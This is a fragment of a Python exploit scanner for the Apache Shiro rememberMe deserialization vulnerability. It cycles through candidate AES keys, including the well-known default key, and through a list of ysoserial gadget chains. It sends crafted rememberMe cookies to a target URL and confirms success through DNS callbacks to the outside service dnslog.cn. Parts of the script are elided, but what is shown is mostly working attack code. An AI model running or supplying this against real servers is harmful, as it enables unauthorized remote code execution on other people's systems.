...
jar = ['BeanShell1','CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3','CommonsCollections4','CommonsCollections5','CommonsCollections6','Jdk7u21','Groovy1','JBossInterceptors1','JSON1','Spring1','Spring2']

header = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'}

def poc(url):
    try:
        rep = requests.get('http://dnslog.cn/getdomain.php', headers=header, timeout=15)
        searchobj = re.search(r'=(.*);', rep.headers['Set-Cookie'])
        target = rep.text  #获取测试域名
        for real_key in shiro_key:

            payload = generator(target, real_key)
            requests.get(url, cookies={'rememberMe': payload.decode()}, timeout=15, verify=False)
            time.sleep(0.5)

            rep1 = requests.get('http://dnslog.cn/getrecords.php', cookies={'PHPSESSID': searchobj.group(1)} ,headers=header, timeout=15)

            print('now is testing： ',real_key)
            if 'dnslog' in rep1.text:
                print('[+]target is vulnerable')
                print('[+]key：{}'.format(real_key))
                #print('PHPSESSID：',searchobj.group(1))

                rep = requests.get('http://dnslog.cn/getdomain.php', headers=header, timeout=15)
                searchobj1 = re.search(r'=(.*);', rep.headers['Set-Cookie'])
                target1 = rep.text  #获取测试域名
                for real_jar in jar:
                    payload1 = generator1(real_jar, target1, real_key)
                    requests.get(url, cookies={'rememberMe': payload1.decode()}, timeout=15, verify=False)
                    time.sleep(1)

                    rep2 = requests.get('http://dnslog.cn/getrecords.php', cookies={'PHPSESSID': searchobj1.group(1)} ,headers=header, timeout=15)
                    #print('PHPSESSID2：',searchobj.group(1))
                    if 'dnslog' in rep2.text:
                        print('[+]target is vulnerable')
                        print('[+]key：{}'.format(real_key))
                        print('[+]jar： {}'.format(real_jar))
                        return
                print('[+]target is vulnerable and key：{} but vulnerable jar not found! or target is Windows OS!'.format(real_key))
                return
...
def generator1(real_jar,command,real_key='kPH+bIxk5D2deZiIxcaaaA=='):
